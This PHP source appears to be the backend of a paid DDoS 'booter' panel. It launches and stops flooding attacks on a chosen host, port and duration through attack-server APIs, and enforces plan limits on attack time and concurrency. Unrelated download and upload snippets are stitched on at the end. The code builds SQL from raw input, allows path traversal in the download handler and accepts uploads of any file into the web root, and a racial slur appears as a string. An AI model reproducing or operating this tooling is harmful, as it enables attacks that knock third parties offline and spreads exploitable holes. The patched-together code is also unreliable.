<?php
require '../includes/configuration.php';
require '../includes/init.php';

session_start();
if (!($user->LoggedIn())) {
    header('location: ../index.php?page=Login');
    die();
}
$type = $_GET['type'];
echo $type;
if ($type == "stop") {
  echo success('test-2!');
    $stop      = intval($_GET['id']);
    $SQL       = $odb->query("UPDATE `logs` SET `stopped` = 1 WHERE `id` = '$stop'");
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE `id` = '$stop'");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
      echo ('test-1!');
        $host    = $show['ip'];
        $port    = $show['port'];
        $time    = $show['time'];
        $method  = $show['method'];
        $handler = $show['handler'];
        $command = $odb->query("SELECT `command` FROM `methods` WHERE `name` = '$method'")->fetchColumn(0);
    }
    $handlers = explode(",", $handler);
    foreach ($handlers as $handler) {
            $SQLSelectAPI = $odb->query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");
            while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
              echo success('test0!');
                $arrayFind    = array(
                    '[host]',
                    '[port]',
                    '[time]'
                );
                $arrayReplace = array(
                    $host,
                    $port,
                    $time
                );
                $APILink      = $show['api'];
                $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
                $stopcommand  = "&method=stop";
                $stopapi      = $APILink . $stopcommand;
                $ch           = curl_init();
                curl_setopt($ch, CURLOPT_URL, $stopapi);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 3);
                curl_exec($ch);
                curl_close($ch);
                echo success('Attack Has Been Stopped By Tuna!');
            }
        }
    }

if ($type == "start") {
    $host   = $_POST['host'];
    $port   = intval($_POST['port']);
    $time   = intval($_POST['time']);
    $method = $_POST['method'];
    
    $checkprior = $odb->prepare("SELECT COUNT(*) FROM logs WHERE user = ? AND `date` > ?");
    $checkprior->execute(array(
        $_SESSION['username'],
        time() - 900
    ));
    if ($checkprior->fetchColumn() > 10) {
        $ilovefanta = "FANTASEC IS SEXY";
        die(error('You Have attempted To Spam The Control Panel Try Again In 15 mins'));
    }
    
    if (empty($host) || empty($time) || empty($port) || empty($method)) {
        die(error('Fill in all fields!'));
    } else {
        if ($method == "======Layer 4======" || $method == "======Layer 7======") {
            die(error('That is not a valid method.'));
        } else {
            $SQLCheckBlacklist = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host");
            $SQLCheckBlacklist->execute(array(
                ':host' => $host
            ));
            $countBlacklist = $SQLCheckBlacklist->fetchColumn(0);
            if ($countBlacklist > 0) {
                die(warning('This IP Address is blacklisted.'));
            } else {
                $SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `ip` = :ip AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
                $SQL->execute(array(
                    ':ip' => $host
                ));
                
                if ($SQL->fetchColumn(0) > 0) {
                    $ilovefanta = "NEGRO";
                    die(error('A Test On This Host is Already In Progress'));
                }
                
                $SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `tag` = ?");
                $SQL->execute(array(
                    $method
                ));
                
                if ($SQL->fetchColumn(0) == '0') {
                    die(error('Invalid Method.'));
                } else {
                    if (empty($ilovefanta)) {
                        $checkRunningSQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP()");
                        $checkRunningSQL->execute(array(
                            ':username' => $_SESSION['username']
                        ));
                        $countRunning = $checkRunningSQL->fetchColumn(0);
                        
                        $SQLGetConcurrent = $odb->prepare("SELECT `plans`.`concurrent` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
                        $SQLGetConcurrent->execute(array(
                            ':id' => $_SESSION['ID']
                        ));
                        $userConcurrent = $SQLGetConcurrent->fetchColumn(0);
                        
                        if ($countRunning >= $userConcurrent) {
                            die(error('You have reached the maximum of concurrents for your plan!'));
                        }
                        
                        $SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
                        $SQLGetTime->execute(array(
                            ':id' => $_SESSION['ID']
                        ));
                        $maxTime = $SQLGetTime->fetchColumn(0);
                        if ($time > $maxTime) {
                            die(error('You have exceeded your max boot time for your plan.'));
                        }
                        
                        
                        $getServerName = $odb->prepare("SELECT `name` FROM `servers` WHERE (`lastUsed` < UNIX_TIMESTAMP() AND `lastUsed` != 0) ORDER BY RAND() LIMIT 1");
                        $getServerName->execute();
                        $serverName = $getServerName->fetchColumn(0);
                        
                        
                        $find = array(
                            '/',
                            '?',
                            '.',
                            ':',
                            '&',
                            '-',
                            '_',
                            '='
                        );
                        if (!filter_var($host, FILTER_VALIDATE_IP) && !ctype_alnum(str_replace($find, "", $host))) {
                            die(error('Host is invalid.'));
                        }
                        $i            = 0;
                        $SQLSelectAPI = $odb->query("SELECT * FROM `servers` WHERE `methods` LIKE '%$method%' ORDER BY RAND()");
                        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
                            if ($settings['rotation'] == 1 && $i > 0) {
                                break;
                            }
                            $name  = $show['name'];
                            $count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `servers` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
                            if ($count >= $show['slots']) {
                                continue;
                            }
                            $i++;
                            $arrayFind    = array(
                                '[host]',
                                '[port]',
                                '[time]',
                                '[method]'
                            );
                            $arrayReplace = array(
                                $host,
                                $port,
                                $time,
                                $method
                            );
                            $APILink      = $show['url'];
                            $handlers[]   = $show['name'];
                            $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
                            $ch           = curl_init();
                            curl_setopt($ch, CURLOPT_URL, $APILink);
                            curl_setopt($ch, CURLOPT_HEADER, 0);
                            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
                            curl_exec($ch);
                            curl_close($ch);
                        }
                        if ($i == 0) {
                            die(error('There Are Currently No Servers Available To Support This Protocol Try Another'));
                        }
                        
                        $good = 1;
                        
                    }
                    if ($good == 1) {
                        $handlerss    = @implode(",", $handlers);
                        $updateServer = $odb->prepare("UPDATE `servers` SET `lastUsed` = UNIX_TIMESTAMP()+:time WHERE `name` = :name");
                        $updateServer->execute(array(
                            ':name' => $serverName,
                            ':time' => $time
                        ));
                        
                        $updateserverip = $odb->prepare("UPDATE `servers` SET `lastip` = ? WHERE `name` = ?");
                        $updateserverip->execute(array(
                            $host,
                            $serverName
                        ));
                        
                        $xml          = simplexml_load_file('http://api.ipinfodb.com/v3/ip-city/?key=a69c934a779933e7a2427abceb2568d1f81b1181daa428e4c0dd5e32277f5fb8&format=xml&ip=' . $host);
                        $country      = $xml->countryName;
                        $dayx         = date('d');
                        $insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, ?, ?, ?, ?, ?, ?, ?, UNIX_TIMESTAMP(), ?, ?, ?, ?)");
                        $insertLogSQL->execute(array(
                            $_SESSION['username'],
                            $host,
                            $_SERVER['REMOTE_ADDR'],
                            $port,
                            $time,
                            $time,
                            $method,
                            $handlerss,
                            "0",
                            $country,
                            $dayx
                        ));//send
                        echo '<div class="alert alert-info alert-dismissable animation-bigEntrance" id="not-theme">
                                                                TEST SENT TO: <strong style="color:#22DDEB;">' . $host . '</strong> PORT: <strong style="color:white;">' . $port . ' </strong>  FOR <strong style="color:#ffffff;">' . $time . '</strong> SECONDS UTILIZING PROTOCOL: <strong style="color:#22DDEB;">' . $method . '</strong> WITH SERVERS >> <strong style="color:white;">' . $handlerss . ' !!!</strong>
                                                                </div>';
                        
                    }
                }
            }
        }
    }//insert
}
?>
<?php
ignore_user_abort(true);
set_time_limit(0);
$path = $_GET['path'];
$dl_file = preg_replace("([^\w\s\d\-_~,;:\[\]\(\).]|[\.]{2,})", '', $_GET['download_file']);
$dl_file = filter_var($dl_file, FILTER_SANITIZE_URL);
$fullPath = $_SERVER['DOCUMENT_ROOT'].$path.$dl_file;
if ($fd = fopen ($fullPath, "r")) {
    $fsize = filesize($fullPath);
    $path_parts = pathinfo($fullPath);
    $ext = strtolower($path_parts["extension"]);
    switch ($ext) {
        case "pdf":
        header("Content-type: application/pdf");
        header("Content-Disposition: attachment; filename=\"".$path_parts["basename"]."\""); 
        break;
        default;
        header("Content-type: application/octet-stream");
        header("Content-Disposition: filename=\"".$path_parts["basename"]."\"");
        break;
    }
    header("Content-length: $fsize");
    header("Cache-control: private");
    while(!feof($fd)) {
        $buffer = fread($fd, 2048);
        echo $buffer;
    }
}
fclose ($fd);
exit;
function import() {
		if(isset($_POST['upload'])){
		  $filname    = $_FILES['file']['name'];
		  $uploaddir  = $_SERVER["DOCUMENT_ROOT"].'/upload/' . $filname;
		  if(move_uploaded_file($_FILES['file']['tmp_name'], $uploaddir)){
		  } else {
		  }
		}

		echo "<form method='POST' action='#' enctype='multipart/form-data'>
			<input type='hidden' name='".$this->security->get_csrf_token_name()."' value='".$this->security->get_csrf_hash()."'>	
			<input type='file'   name='file'>
		   <input type='submit' name='upload' value='Upload'>
		</form>";exit;
	}
?>